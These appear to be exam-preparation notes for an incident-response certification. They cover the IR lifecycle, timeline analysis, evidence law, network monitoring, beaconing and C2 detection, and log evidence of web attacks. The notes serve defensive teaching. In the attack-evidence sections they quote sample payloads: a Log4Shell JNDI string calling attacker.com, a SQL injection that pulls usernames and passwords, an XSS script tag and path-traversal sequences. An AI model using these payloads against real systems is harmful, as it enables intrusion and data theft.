A1 — Engagement Lifecycle Management

What CPIA expects you to know

  • Why IR matters: reduce impact, preserve evidence, restore services, meet legal/regulatory duties, and improve controls after the incident.
  • Preparation: policies, playbooks, communication tree, logging readiness, SIEM coverage, NTP, evidence handling kits, contact lists, and escalation matrix.
  • Lifecycle: preparation -> identification -> containment -> eradication -> recovery -> lessons learned.
  • Safe malware handling: isolate environment, hash sample first, store in password-protected archive, avoid public upload without client approval.
  • System-log limitations: logs may be missing, rotated, misconfigured, overwritten, tampered with, or timestamped incorrectly.
Exam trap

Do not delete malware, power off a live host, interrogate a suspected insider, or change a system before evidence is preserved unless there is a justified containment reason and the action is documented.

Benefits & Utility of Incident Response

  • Minimize damage: Rapid structured response limits attacker dwell time and reduces breach scope
  • Preserve evidence: Proper IR methodology ensures evidence is admissible and attributable
  • Restore operations: Structured recovery reduces downtime and business impact
  • Regulatory compliance: Demonstrates due diligence to regulators (GDPR, PCI DSS, FCA)
  • Improve posture: Lessons Learned drives control improvements to prevent recurrence
  • Attribution: Proper IR enables identification of threat actors for legal action or intelligence sharing

The 6 Phases

  • 01
    Preparation — Build IR policy, playbooks, contact lists, logging infrastructure. Done before an incident occurs. Client responsibility.
  • 02
    Identification — Detect and confirm whether an incident has occurred. Avoid false positives. Begin timeline documentation immediately.
  • 03
    Containment — Prevent further damage while preserving evidence. Short-term (isolate) + long-term (patch/rebuild parallel).
  • 04
    Eradication — Remove malware and close attack vectors. Only after forensic acquisition is complete.
  • 05
    Recovery — Restore systems to production. Monitor closely. Verify clean before reconnecting.
  • 06
    Lessons Learned — Post-incident review, typically within 2 weeks. Improve controls, update playbooks.
⚠
Exam traps — actions to NEVER take (Risk: Evidence Corruption)

These actions risk evidence corruption — making evidence inadmissible or destroying forensic artifacts:

SituationWrong ActionRisk: Evidence Corruption
Malware found on live systemPower off immediatelyDestroys RAM, running processes, network connections — volatile data lost
Malware identifiedDelete malware before forensicsDestroys evidence before acquisition
Insider threat suspectedDirectly question the suspectAlerts attacker — they will destroy evidence and cover tracks
Need to isolate hostUnplug without documentingLoses network connection state documentation

Malware Safe Handling

  • Always work in an isolated VM with no network or isolated network only
  • Hash the sample first (MD5 + SHA-256) before any other action
  • Store in password-protected archive (e.g., zip with password)
  • Never send samples via unencrypted email
  • VirusTotal submission: always obtain client consent first — samples may contain sensitive data and become public

System Log Limitations

  • Logs can be tampered or deleted by attackers
  • Not all events are logged — depends on audit policy configuration
  • Log rotation may have overwritten historical events
  • Timestamps unreliable if NTP not synchronized

A2 — Incident Chronology

Exam trap — MACB timestamps

Do not confuse Modified and Changed. Modified means file content changed. Changed means NTFS metadata changed, such as permissions, ownership, rename, or timestamp updates. Timestomping indicators are suspicious only after correlation with USN Journal, event logs, and other metadata.

Timeline analysis workflow

Timeline typePurposeWhen to use
Super-timelineCombines many artefacts into one chronological view.Broad unknown-scope investigations.
Targeted timelineFocuses on selected hosts, users, time windows, or artefact types.Known incident window or specific hypothesis testing.
  1. Define the incident window and relevant timezone.
  2. Acquire logs and artefacts without modifying originals.
  3. Parse with tools such as Plaso/log2timeline.
  4. Normalise timestamps to UTC.
  5. Review in Timesketch, Timeline Explorer, or spreadsheet tooling.
  6. Tag key events: initial access, execution, persistence, lateral movement, exfiltration, containment.
Common confusion:

Modified means file content changed. Changed means NTFS $STANDARD_INFORMATION metadata changed, such as rename, permission, ownership, or timestamp updates.

Timeline fundamentals

  • Purpose: reconstruct what happened, in what order, which systems were affected, and how long the attacker had access.
  • Start early: begin chronology during identification; do not wait until the end of analysis.
  • Normalise time: convert all timestamps to UTC and document source timezone/clock skew.
  • Correlate sources: firewall, proxy, DNS, DHCP, VPN, endpoint, Windows Event Logs, email logs, cloud logs, and analyst actions.
  • Tools: Plaso/log2timeline, Timesketch, Timeline Explorer, SIEM queries, Excel for small cases.

Timestomping indicators

Born/Created time later than Modified time is abnormal. Identical MACB values across multiple files can indicate timestamp manipulation, although legitimate mass-copy operations can also create patterns. However, legitimate scenarios such as file restoration from backup or archive extraction can also create this pattern. Corroborate with other evidence (USN Journal, event logs, file system metadata) before concluding timestomping.

Common Confusions — Timelines

  • NTFS stores timestamps in UTC, but tools may display local time.
  • FAT stores local time, which can be ambiguous without timezone context.
  • Clock skew must be documented rather than silently corrected.

The Correlation Mindset

No single log source tells the complete story. The core IR analyst skill is correlating evidence across multiple sources to reconstruct events.

Correlation Framework

  1. IDENTIFY — What event or alert triggered the investigation?
  2. PIVOT — What other log sources contain related data?
  3. NORMALISE — Align timestamps to UTC; map IP→host via DHCP; map host→user via authentication logs.
  4. RECONSTRUCT — Build a timeline across sources.
  5. VALIDATE — Does the combined evidence support the hypothesis?

Example Investigation Pivot

IDS alert (SMB exploit attempt)
  → Firewall log (confirm traffic allowed; NAT translation)
    → DHCP log (IP → MAC → hostname at that time)
      → Windows Event 4624 (who authenticated from that host?)
        → Windows Event 4688 (what process was created?)
          → Proxy log (did the host make outbound connections?)
            → DNS log (what domains were resolved?)

A3 — Law & Compliance

Terminology note:

The ACPO Good Practice Guide for Computer-Based Electronic Evidence is commonly still referenced as ACPO principles. In the UK, ACPO functions were replaced by the NPCC, but the four principles remain widely cited in digital evidence handling.

  • Chain of custody: who collected, handled, transferred, stored, and analysed evidence; include time, location, purpose, and signatures where required.
  • ACPO principles: avoid altering evidence; if access to original evidence is necessary, be competent and document actions; maintain audit trail; case officer is responsible.
  • Regulatory issues: GDPR, PCI DSS, financial regulators, sector-specific reporting, and contractual notification obligations.

GDPR — Key Timeframes

  • 72 hours — notify supervisory authority after discovering a breach.
  • Without undue delay — notify data subjects if the breach poses high risk to their rights and freedoms.
  • Log retention: no fixed number in GDPR, but the storage limitation principle requires not keeping data longer than necessary.
  • PCI DSS: minimum 12 months log retention; 3 months must be immediately accessible.
  • Law enforcement: engage when criminal activity is suspected or client/legal counsel directs it; understand evidence seizure and operational impact.
  • CERTs: coordinate, advise, and share information; they are normally not law-enforcement bodies.
CSAM rule

If child sexual abuse material is discovered, stop unnecessary handling and escalate immediately according to law and organisational policy. Do not continue exploring the material.

DMCA and Reverse Engineering — Permitted vs Problematic

Exam tip: CPIA questions usually test risk judgement, not legal memorisation. For reverse engineering, ask: is it authorised, within scope, and defensible as security analysis?

Good Practice Guide for Computer-Based Electronic Evidence

  • Full name: Good Practice Guide for Computer-Based Electronic Evidence.
  • Core idea: digital evidence handling must preserve integrity, maintain an audit trail, and allow another competent examiner to reproduce the process.
  • Common confusion: documentation is not optional admin work; it is part of evidential integrity.

Evidence Integrity Throughout the Investigation

Key principle: Another competent examiner must be able to reproduce your process from your documentation alone.

A4 — Record Keeping, Interim Reporting & Results

  • Record in real time: do not reconstruct analyst notes from memory.
  • Record content: timestamp, analyst, system, command/tool, result, evidence ID, decision and rationale.
  • Interim reports: brief the client when urgent action is required; follow verbal briefings with written confirmation.
  • Final report: executive summary, scope, methodology, timeline, findings, IoCs, impact, evidence list, and prioritised recommendations.
  • Corrections: append dated corrections instead of silently editing original notes.

DNS port 53 — UDP vs TCP

DNS queries use UDP. Zone transfers (AXFR) and responses >512 bytes use TCP. This is why DNS C2 bypasses firewalls — attackers exploit UDP port 53 because most firewalls allow outbound DNS unconditionally.

SMTP port 587 vs 25

Port 587 = submission (client → server, requires authentication). Port 25 = server-to-server relay (no auth required). Distinguish these when analysing email routing and investigating phishing/spam origin.

B2 — Network Architectures

  • Media: CAT5/6/7 copper, fibre, 10/100/1000Base Ethernet, single-mode/multi-mode fibre.
  • Shared vs switched: shared media is easier to sniff; switched networks usually require SPAN/TAP.
  • VLANs: logical segmentation; misconfigured trunks or ACLs can expose sensitive networks.
  • NAT: translates private to public addresses; correlate NAT/firewall/DHCP logs for attribution.
  • Windows domains: AD, domain controllers, Kerberos/NTLM, GPO, domain admin risk.
  • Routing/Subnets/ASN: determine traffic path, ownership, and internet routing context.
  • Wireless: 802.11 security depends on encryption, authentication, and rogue AP detection.

802.1X and Network Access Control (NAC)

802.1X provides port-based network access control. Devices must authenticate before gaining network access.

  • Components: Supplicant (device), Authenticator (switch/AP), Authentication server (RADIUS).
  • EAP methods: EAP-TLS (certificate-based, strongest), PEAP (password in TLS tunnel), EAP-TTLS.
  • NAC enforcement: check device compliance (patches, AV, domain membership) before granting access.
  • Investigation relevance: NAC logs show which device authenticated, when, from which port, and compliance status.
  • Bypass risks: MAC spoofing, rogue devices on unmanaged ports, VLAN hopping, NAC misconfiguration.
  • Posture assessment: non-compliant devices may be quarantined to a remediation VLAN.
Exam tip: 802.1X logs from RADIUS can correlate with DHCP and authentication logs to identify which physical device was connected at a specific time.

SIEM — Security Information and Event Management

A SIEM aggregates logs from multiple sources, normalises them into a common schema, applies correlation rules, generates alerts, and enables ad-hoc search across historical data.

  • Log Aggregation: Collect logs from firewalls, proxies, endpoints, cloud, email, and authentication systems.
  • Normalisation: Convert different log formats into a common schema for consistent querying.
  • Correlation: Rule-based (if X then Y) and statistical (anomaly detection) analysis across sources.
  • Alerting: Generate alerts when correlation rules match suspicious patterns.
  • Search / Investigation: Ad-hoc queries across historical data for incident response.
  • Dashboards: Visual overview of security posture and trends.

Common platforms: Splunk, Microsoft Sentinel, Elastic SIEM, IBM QRadar, ArcSight.

Certificate Pinning

  • What: Application hardcodes expected certificate or public key; rejects connections with different certificates even if trusted by the OS.
  • Purpose: Prevents MITM even with a compromised CA; protects against certificate mis-issuance.
  • IR impact: Legitimate inspection tools (corporate proxies, forensic capture) may be blocked by pinning — the application sees the proxy's certificate and rejects it.
  • Examples: Chrome previously used HPKP (deprecated); mobile apps often implement custom pinning; certificate transparency logs help detect mis-issuance.
  • Bypass for IR: Use endpoint-based capture rather than network interception; check application trust stores; some pinning can be bypassed with Frida or similar tools in authorised testing.

Timestamp Confusions

  • NTFS stores timestamps in UTC — but tools may display local time.
  • FAT stores timestamps in local time — ambiguous without timezone context.
  • Modified means file content changed.
  • Changed means NTFS $STANDARD_INFORMATION metadata changed (e.g., rename, permission, ownership).

  • Born/Created later than Modified is suspicious but not definitive — legitimate backup restoration can also create this pattern.
  • Identical MACB values across multiple files can indicate timestamp manipulation, although legitimate mass-copy operations can also create patterns.

Forensic Evidence Confusions

  • Prefetch proves execution; Shimcache proves file existence — Shimcache does not reliably prove execution on all Windows versions.
  • USB artefact proves connection — file access or exfiltration requires additional correlation.
  • Hash-based IoCs change with one byte — behavioural IoCs (TTPs) are more robust.
  • VirusTotal detection ratio is context, not proof — 1/70 may be a false positive or targeted malware; 40/70 usually indicates known malware.
  • AV names are not standardised across vendors — interpret with caution.

Firewall / ACL Confusions

  • Rule order matters — first matching rule usually decides the action.
  • NAT is not a security control — it changes addressing; does not replace filtering or logging.

Network Confusions

  • IDS = detect/alert (passive); IPS = detect/prevent (inline).
  • NetFlow = flow summaries (no payload); PCAP = full packets.
  • JA3 = TLS client fingerprint — helps identify malware families but is not definitive attribution.
  • WPA2 is not automatically secure — depends on passphrase strength, WPS status, and enterprise authentication config.
  • TLS 1.2 / 1.3 preferred — SSLv2/v3 and TLS 1.0/1.1 are obsolete.

ATT&CK Confusions

  • One technique can map to multiple tactics depending on intent (e.g., Scheduled Task = Execution or Persistence).
  • Hashes and IP addresses are easy to block but easy for attackers to change. Behavioural IoCs are more robust.
  • Credential Access ≠ Privilege Escalation — different tactics even though they can be related.

Acquisition Confusions

  • Volatile evidence first: CPU registers/cache → RAM → network state → running processes → disk → archival media → remote logging.
  • HPA/DCO can hide disk areas — forensic tools should detect and document them.
  • SSD TRIM and wear levelling affect deleted-data recovery.
  • Static acquisition = powered off; Live acquisition = running system.
  • Documentation is not optional admin work — it is part of evidential integrity.

TLS handshake flow and JA3

Exam trap — Null DACL vs Empty DACL

DLL Hijacking and Unquoted Service Paths

  • DLL hijacking: Windows searches DLL in order — same dir first, then System32, then PATH. Attacker places malicious DLL in earlier search path to load instead of legitimate one.

  • Unquoted service paths: C:\Program Files\My App\svc.exe unquoted → Windows tries C:\Program.exe first. If that path is writable → privilege escalation to SYSTEM.
  • Detection: Sysmon Event 7 (ImageLoaded) for unexpected DLL path. PowerShell: Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"'}

DNS-over-HTTPS (DoH) and DNS-over-TLS (DoT)

  • DoH (DNS-over-HTTPS): DNS queries sent over HTTPS (port 443) to resolvers like Cloudflare (1.1.1.1) or Google (8.8.8.8). Blends with normal web traffic — traditional DNS monitoring tools cannot see queries.
  • DoT (DNS-over-TLS): DNS queries sent over TLS (port 853). Easier to identify than DoH because it uses a dedicated port, but content is encrypted.
  • Blind spot: Both bypass corporate DNS resolvers and logging. Malware using DoH/DoT is invisible to DNS-layer security controls.
  • Detection: Monitor for outbound connections to known DoH/DoT resolvers; endpoint DNS logs may still capture queries; check for TLS connections to port 853.
  • Investigation: Proxy logs may show HTTPS connections to DoH endpoints; JA3 fingerprinting can identify DoH clients; endpoint telemetry (EDR) can capture DNS before encryption.

D1 — Network Traffic Capture

NetFlow / IPFIX basics

A flow record summarises a conversation rather than storing full packets. A typical flow tuple includes source IP, destination IP, source port, destination port, protocol, timestamps, bytes, and packets.

  • Use cases: Beaconing detection, exfiltration volume analysis, lateral movement discovery, and long-term network visibility.
  • Limitation: No payload visibility, so it cannot directly show exploit strings, credentials, or file contents.
  • Collection options: full packet capture, limited/header capture, NetFlow/IPFIX, Zeek logs, SPAN, traditional TAP, aggregating TAP.
  • Scoping: estimate bandwidth, peak traffic, retention, storage, capture filter, legal/sensitive data constraints, and collection location.
  • Deployment: choose points that see relevant traffic; avoid asymmetric routing blind spots.
  • Integrity: hash PCAPs, document time source, interface, filters, tool versions, and chain of custody.
  • Safety: ensure capture device does not create loops, bottlenecks, or new exposure.

Deployment Location and Impact Assessment

  • Deployment location matters: Capture device at network perimeter sees inbound attacks but misses internal lateral movement. Device at core switch sees both — preferred.
  • Impact before deploying: SPAN port may degrade switch performance under load. TAP requires brief link interruption. Aggregating TAP introduces a single point of failure.
  • Document: Network diagram changes, new device MAC/IP, any routing modifications. Capture device must be hardened — attacker should not be able to reach or modify it.

D3 — Network Configuration Security Issues

  • Detect routing issues, DNS leakage, unexpected traffic paths, email-routing errors, and firewall/rule failures.
  • Firewall/proxy bypass indicators: direct internet access, non-proxy ports, split tunneling, unmonitored IPv6, rogue DNS resolvers.
  • Evidence: traceroute/path logs, firewall denies/permits, proxy bypass logs, DNS queries, mail headers, routing tables.

Specific Misconfiguration Examples

DNS leakage

Internal host queries an external DNS server (e.g., 8.8.8.8) instead of the approved internal resolver. This exposes internal domain names to an external observer. Detection: DNS query logs showing internal hosts as source and non-approved DNS servers as destination.

Split tunneling

VPN client routes only corporate traffic through the tunnel; all other traffic goes direct to the internet. An attacker on a compromised VPN host can reach both the internal network and external C2 simultaneously. Detection: VPN client configuration audit, simultaneous routes to internal and external destinations from the same host.

Rogue DNS resolver

Host uses a DNS server not on the approved list. Risk of DNS hijacking, cache poisoning, or traffic interception. Detection: DNS server field in DHCP logs compared against the approved resolver list.

Email routing errors

MX records pointing to unexpected hosts, or missing SPF/DKIM/DMARC records. Enables email spoofing and phishing. Detection: DNS MX record audit, email header Received-chain analysis.

Default credentials on network devices

Network devices running with default SNMP community strings (public/private) or default admin passwords. Enables unauthorised access and configuration theft. Detection: SNMP scan results, authentication logs showing default usernames.

Firewall and Proxy Bypass Indicators

  • Protocol tunneling: SSH over HTTPS, C2 over DNS — blocked protocol carried inside allowed one. Detect with DPI — verify protocol matches port.
  • Rogue DNS resolver: Host configured with external DNS bypassing corporate resolver. DNS logging gap. Detect: queries not going to authorised internal resolvers.
  • Direct internet access: Host accessing internet without proxy. Detect: firewall hits to internet IPs from hosts absent in proxy logs.
  • IPv6 bypass: IPv4 filtered but IPv6 unmonitored. Detect: ensure IPv6 firewall rules equivalent to IPv4 rules.
  • Split tunneling: VPN client allows local and internet access simultaneously — traffic bypasses corporate inspection.

D4 — Unusual Protocol Behaviour

  • Verify protocol by content, not port number; HTTP on 443 without TLS or SSH on 80 may be suspicious.
  • Look for invalid protocol sequences, malformed headers, illegal commands, abnormal user agents, unexpected methods, or cache-poisoning attempts.
  • Use Wireshark, Zeek protocol logs, Suricata/Snort alerts, and manual payload review.

Practical Examples

HTTP on port 443 without TLS

Packet capture shows HTTP request/response directly on port 443 without a TLS ClientHello. Legitimate HTTPS requires TLS handshake first. May indicate port evasion, a C2 channel mimicking the HTTPS port, or a misconfigured service.

SSH on non-standard port

SSH running on port 80 or 443 to evade firewall rules. Detection: protocol content inspection reveals SSH banner despite the web port.

DNS with oversized responses

Normal DNS responses are typically small. Responses consistently exceeding 512 bytes may indicate DNS tunneling data exfiltration.

ICMP with payload

Normal ICMP echo request/reply has minimal data. ICMP with large or structured payloads may indicate ICMP tunneling (e.g., icmpsh, tunnel tools).

Invalid HTTP methods

Legitimate browsers use GET, POST, PUT, DELETE. Unusual methods (CONNECT used as C2, custom verbs) in web logs warrant investigation.

FTP with encoded filenames

Filenames containing Base64 or hex-encoded strings in FTP sessions may indicate exfiltration staging.

ARP Spoofing and DNS Cache Poisoning

  • ARP spoofing: Attacker sends unsolicited ARP replies claiming their MAC for victim IP → MITM. Detect: duplicate ARP replies for same IP, ARP for gateway from unexpected MAC.
  • DNS cache poisoning: Inject false DNS records into resolver cache → victims directed to attacker IP. Detect: response IP mismatch vs authoritative data; DNSSEC prevents poisoning.

D5 — Beaconing

  • Beaconing is repeated outbound communication from compromised host to C2 or staging infrastructure.
  • Indicators: regular intervals, jitter, small payloads, uncommon destination, long-lived low-volume flows, DGA domains.
  • Detection: frequency analysis, proxy/DNS logs, Zeek conn.log, JA3, HTTP URI/user-agent patterns, IDS signatures.
  • Distinguish from legitimate beacons: software update agents, telemetry, NTP, EDR, cloud sync.

Beaconing Detection Techniques

  • Interval analysis: Calculate time between consecutive connections to same destination; look for consistent intervals (e.g., every 60s ± 5s jitter).
  • Chi-squared test: Compare observed connection intervals against uniform distribution; beaconing shows low chi-squared p-value (non-random pattern).
  • FFT (Fast Fourier Transform): Apply to connection time series; beaconing produces distinct frequency peaks at the beacon interval.
  • DBSCAN clustering: Cluster Zeek conn.log entries by destination IP and inter-arrival time; tight clusters with regular spacing indicate beaconing.
  • Volume analysis: Beaconing typically shows small, consistent payload sizes; contrast with bulk data transfer.

Detection Tools and Covert Beacon Channels

  • RITA (Real Intelligence Threat Analytics): Purpose-built open-source beacon detector. Ingests Zeek logs → scores connections for interval regularity, long connections, and DNS anomalies automatically.
  • Statistical method: For each src→dst pair: collect timestamps → compute inter-connection intervals → calculate StdDev. Low StdDev = regular = beacon candidate.
  • DNS beaconing: Query [encoded].c2domain.com every N seconds. No TCP needed — bypasses most firewalls. Detect: high query rate to single domain, high-entropy subdomains.
  • ICMP beaconing: Ping to C2 at regular intervals. Data encoded in ICMP echo payload. Detect: non-standard payload size/content, abnormal frequency.
  • Sleeping implants: Very long beacon interval (hours/days) — deliberately evades short-window detection. Requires long observation window.

JA3/JA3S and JA4+ Fingerprinting

JA3 hashes TLS ClientHello fields (version, cipher suites, extensions, elliptic curves, EC point formats) to create a client fingerprint. JA3S does the same for ServerHello. Together they fingerprint both sides of a TLS connection.

  • Use: Identify malware families by TLS client behaviour even when payload is encrypted; detect C2 frameworks by their default TLS configuration.
  • Limitation: Modern malware randomises cipher suites or mimics legitimate browsers to rotate JA3 hashes. JA3 alone is not definitive attribution.
  • Detection: Compare observed JA3 hashes against known-good (browser/update) and known-bad (Cobalt Strike, Metasploit) databases.

JA4+ is a newer fingerprinting suite that improves on JA3 limitations:

  • JA4: Client fingerprint with structured format (TLS version, cipher count, extension count, ALPN, SNI presence).
  • JA4S: Server response fingerprint.
  • JA4H: HTTP client fingerprint (method, headers, order, cookies).
  • JA4X: X.509 certificate fingerprint.
  • Improvement: More resistant to randomisation; uses sorted cipher/extension lists; provides more granular identification.

JA4 format example: t13d1516h2_8daaf6152771_e5627efa2ab1 — where t13 = TLS 1.3, d = draft, 15 = number of ciphers, 16 = number of extensions, h2 = ALPN (HTTP/2), followed by truncated hashes of sorted ciphers and extensions.

Note: JA4+ is developed by FoxIO (John Althouse), not an IETF standard or RFC. It is an open-source project gaining adoption in network security tools.
Exam tip: JA3 helps identify C2 tools but is not proof. Correlate with other indicators (beaconing, domain age, certificate details, endpoint process telemetry).

DNS-Based C2 and Domain Fronting Detail

  • DNS C2 mechanism: Implant encodes results in DNS subdomain queries: base64chunk.c2domain.com. Attacker answers with encoded commands in DNS response (TXT, CNAME, A records).
  • Detection: High query rate to single domain, subdomain labels >50 chars, high Shannon entropy subdomains (~5.0 bits/char vs legitimate ~3.5), unusual query types (TXT, NULL, CNAME in high volume)
  • Domain fronting: HTTPS request — SNI shows legitimate CDN (cloudflare.com), Host header routes to attacker backend. Firewall sees legit CDN → allows. Detection: TLS inspection; compare SNI vs Host header mismatch.
Why DNS C2 is dangerous — bypass mechanism

Implant sends queries via UDP port 53 — no TCP connection needed. Firewalls typically allow outbound DNS unconditionally. No TCP handshake → no connection log. Data is encoded in subdomains: base64data.c2domain.com. Detection is only possible through DNS log analysis (RITA, Zeek dns.log, Shannon entropy of subdomains).

D8 — Exfiltration of Data

  • Exfiltration indicators: large outbound uploads, compression/encryption before transfer, rare destination, cloud-storage uploads, DNS tunneling, email attachments.

  • Sources: proxy, firewall, NetFlow, DNS, DLP, cloud audit logs, endpoint process/file telemetry.

Cloud Storage Exfil and Statistical Detection

  • Cloud storage exfiltration: Upload to Dropbox, OneDrive, Google Drive, AWS S3. Detect in O365 UAL: AnonymousLinkCreated before large outbound volume to cloud storage APIs.

  • Data staging detection: Large internal file copies + archive creation (zip/rar/7z) just before network transfer. Detect via Sysmon Event 11 or DLP.

D9 — Incoming Attacks

  • Public-facing attacks include exploitation of VPN, web apps, email gateways, RDP, SSH, SMB, and exposed admin portals.
  • Evidence: WAF/web logs, IDS signatures, firewall permits, auth failures/successes, uploaded files, new processes after request.
  • Successful attack signs: HTTP 200 after exploit payload, webshell writes, new account, service start, reverse shell, privilege escalation events.

Common Exploit Patterns and Evidence

SQL Injection

  • Evidence: web logs show single-quote, UNION SELECT, OR 1=1, comment sequences (--, #, /*) in query parameters.
  • Detection: WAF signatures, repeated 500 errors after specific input patterns, abnormal database query logs.

Webshell deployment

  • Evidence: new file created in webroot (e.g., cmd.php, error_log.asp), unusual file size, suspicious content (eval, exec, system calls).
  • Detection: file integrity monitoring, web server logs showing POST to an unusual file, AV/EDR alerts.

Command injection

  • Evidence: shell metacharacters (;, |, &&, backticks, $()) in HTTP parameters.
  • Detection: WAF rules, process creation logs showing spawned shell (cmd.exe, /bin/sh) as child of web server process.

Path traversal

  • Evidence: ../, ..\, URL-encoded variations (%2e%2e%2f) in request URIs.
  • Detection: WAF rules, web server error logs showing access to unexpected file paths.

RDP brute force

  • Evidence: high volume of failed logons (Event 4625, logon type 10) from an external IP, followed by a successful logon (4624 type 10).
  • Detection: Windows Event Log correlation, SIEM threshold rule on 4625 events.

Credential stuffing against VPN

  • Evidence: multiple failed VPN authentication attempts from various source IPs using known breached credentials.
  • Detection: VPN logs, account lockout events (4740), geolocation anomalies.

Log4Shell (CVE-2021-44228)

  • What: JNDI injection vulnerability in Apache Log4j 2. Attacker sends crafted string (e.g., ${jndi:ldap://attacker.com/a}) which Log4j evaluates, causing the vulnerable server to fetch and execute a remote payload.
  • Evidence: web logs containing ${jndi: in headers (User-Agent, X-Forwarded-For, Referer) or request parameters; outbound LDAP/RMI connections from web server to external IPs; new Java processes spawned after web request.
  • Detection: WAF rules for ${jndi: pattern (including obfuscated variants like ${${lower:j}ndi:); IDS signatures for JNDI injection; endpoint process monitoring for java.exe spawning shell commands.
  • Scope: Affects any application using Log4j 2.x — many enterprise Java applications, cloud services, and appliances were vulnerable.
  • Follow-up CVEs: CVE-2021-45046 (incomplete fix in 2.15.0 — still vulnerable in certain configurations) and CVE-2021-45105 (DoS via recursive lookup). Upgrade to Log4j 2.17.0+ for complete fix.

ProxyLogon / ProxyShell (Exchange exploits)

  • ProxyLogon (CVE-2021-26855 + CVE-2021-27065): SSRF vulnerability in Exchange allowing unauthenticated access to admin endpoints; combined with arbitrary file write to deploy webshells.
  • ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207): Pre-auth SSRF → privilege escalation → arbitrary file write; exploited via Exchange Client Access Service (CAS) on port 443.
  • Evidence: webshell files written to Exchange directories (e.g., C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\); IIS logs showing exploitation URIs (/owa/auth/x.js, /ecp/y.js); new scheduled tasks or services; LSASS access by Exchange worker processes.
  • Detection: Microsoft Exchange CU patches; IOC scanning tools from Microsoft; IIS log analysis for known exploitation patterns; file integrity monitoring on Exchange directories.
  • Post-exploitation: Attackers commonly deploy China Chopper, ASPXSpy, or other webshells; dump credentials from Exchange; move laterally to DC.

Web Shell Access Patterns and Authentication Failures

  • Web shell in logs: POST request to static-looking file (.php/.aspx in /images/ or /upload/) followed by large response body. Command: grep "POST.*200" access.log filter by high response bytes.
  • RCE confirmation: Web server process (w3wp.exe, httpd, nginx) spawning cmd.exe, bash, or powershell — Event 4688 parent-child pattern.
  • Email authentication failures = phishing: SPF FAIL = sending IP not in domain SPF record. DKIM FAIL = message modified or key mismatch. DMARC FAIL = neither SPF nor DKIM aligned → likely spoofed sender.
  • BEC indicators: Display name spoofing, lookalike domain (micros0ft.com), unusual sending time, financial urgency, changed reply-to address.

Web Application Attack Evidence

SQL Injection in Web Logs

  • Normal: GET /products?id=42 HTTP/1.1
  • Malicious: GET /products?id=42' UNION SELECT username,password FROM users-- HTTP/1.1
  • Detection: WAF logs, repeated 500 errors, unusual parameter length, SQL keywords in query strings.

Cross-Site Scripting (XSS)

  • Reflected: GET /search?q=<script>alert(1)</script> HTTP/1.1
  • Stored: POST to comment field, then GET renders payload for other users.
  • Detection: script tags in parameters, event handlers (onerror, onload), encoded variants.

SSRF

  • Evidence: internal request to cloud metadata endpoint (169.254.169.254), internal IP ranges, localhost.
  • Detection: outbound connections from web server to unexpected internal destinations.

Deserialisation

  • Evidence: serialised objects in request body (Java: rO0AB..., PHP: O:..., .NET: AAEAAAD...).
  • Detection: unusual content types, known gadget chain patterns, new processes spawned by web server.

D10 — Reconnaissance

  • External recon: scans against public IPs, service enumeration, vulnerability probes, directory brute force.
  • Internal recon: port scans, network share discovery, LDAP queries, AD enumeration, ping sweeps, DNS zone-like enumeration.
  • Detection: connection fan-out, sequential ports/IPs, repeated 404/401, SMB/LDAP query patterns, IDS scan signatures.

What Scan Evidence Looks Like in Logs

Port scan evidence in firewall/IDS logs

  • Sequential connection attempts to ports 1-1024 on a single host.
  • SYN packets without corresponding ACK completion (half-open scan).
  • Connection fan-out: single source IP contacting many internal IPs on the same port within a short timeframe.
  • IDS signatures: "SCAN nmap SYN", "PROTOCOL-ICMP PING NMAP".

Service enumeration evidence

  • Banner grabbing attempts: connections to services that immediately disconnect after receiving the banner.
  • DNS zone transfer attempts (AXFR queries from non-authoritative sources).
  • SNMP queries with common community strings (public, private).
  • LDAP anonymous bind attempts.

Web reconnaissance evidence

  • Rapid 404 responses indicating directory brute force (gobuster, dirb, dirbuster patterns).
  • Requests for common admin paths (/admin, /wp-admin, /phpmyadmin).
  • User-Agent strings matching known scanning tools.
  • HTTP HEAD requests probing for HTTP methods.

Internal recon evidence

  • ARP requests for large IP ranges.
  • NetBIOS name queries (UDP 137) or LDAP searches for users/computers.
  • SMB null session enumeration attempts.
  • nltest /domain_trusts style queries visible in Windows Event Logs.

Slow and Distributed Scanning Detection

  • Slow scan: Same scan spread over hours or days to stay below per-minute IDS thresholds. Detection: aggregate connection data over long windows; single source scanning many ports slowly over time.
  • Distributed scan: Coordinated across many source IPs (botnet) — each individual source looks normal. Detection: aggregate by destination across all sources; many IPs scanning same target in sequence.
  • Detection challenges: Both techniques deliberately evade threshold-based IDS. Require: long-window correlation, reputation scoring, ML anomaly detection, or honeypot-triggered alerting.
  • Indicators despite evasion: Sequential port/IP destination patterns across sources; matching tool fingerprints; honeypot host touched by multiple distributed IPs.

JavaScript De-obfuscation Techniques

  • String.fromCharCode(72,101,108,108,111): Builds strings from char codes to hide payload strings from static analysis. Reveal: run expression in browser console → "Hello"

  • atob("base64string"): Base64 decode then execute. Decode separately first: atob() in browser console or CyberChef.
  • Variable obfuscation (_0x1a2b): Identifiers replaced with random strings. Use JS beautifier + de4js to partially restore readability.
  • Safe environment: Use about:blank DevTools console, JSDetox, or isolated VM to de-obfuscate without risk.

D13 — False Positive Acknowledgement

Snort / Suricata rule structure

# Basic IDS rule anatomy:
# action protocol source source_port -> destination destination_port (options)
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"Possible SMB exploit attempt"; content:"|FF 53 4D 42|"; sid:1000001; rev:1;)
  • alert: Action to take when matched.
  • tcp: Protocol.
  • $EXTERNAL_NET any -> $HOME_NET 445: Direction and ports.
  • msg: Human-readable alert text.
  • content: Payload pattern to match.
  • sid/rev: Signature ID and revision.
  • Do not accept IDS alert title as fact; inspect packet/payload/log context.
  • Validate source/destination role, direction, payload content, rule logic, threshold, and whether vulnerability exists.
  • False positives: vulnerability scanner, admin tool, backup software, monitoring agent, test environment, old signature.
  • Signature improvement: add flow direction, content anchors, PCRE constraints, thresholds, reputation checks, or vulnerability context.
Common confusion:

A true positive means the signature matched real malicious or policy-relevant activity. A false positive means the alert fired on benign traffic. Improving signatures usually means adding context, content depth, flow direction, thresholds, or exclusions.

False Positive vs True Positive Decision Framework

Evaluation Steps

  1. Read the rule content, not just the alert title.
  2. Check source/destination — is this expected traffic?
  3. Inspect payload — does it match the signature intent?
  4. Check rule logic — content anchor, PCRE breadth.
  5. Check threshold — single event or repeated?
